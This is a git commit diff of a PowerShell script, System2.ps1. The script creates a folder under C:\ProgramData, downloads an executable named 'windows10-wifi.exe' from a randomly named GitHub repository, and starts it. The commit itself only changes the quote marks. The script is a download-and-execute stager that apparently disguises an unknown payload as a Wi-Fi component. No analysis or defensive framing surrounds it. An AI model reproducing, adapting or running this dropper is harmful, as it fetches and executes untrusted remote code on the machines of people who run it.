513b511a34bee637bd74731b392a17ef84152f5b
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2023-02-02 13:20:35 -0500

    Update System2.ps1

--- System2.ps1
+++ System2.ps1
@@ -1,5 +1,5 @@
 mkdir C:\ProgramData\zDATAxD
-$source = 'https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/windows10-wifi.exe'
-$destination = 'C:\ProgramData\zDATAxD\windows10-wifi.exe'
+$source = "https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/windows10-wifi.exe"
+$destination = "C:\ProgramData\zDATAxD\windows10-wifi.exe"
 Invoke-WebRequest -Uri $source -OutFile $destination
 start C:\ProgramData\zDATAxD\windows10-wifi.exe
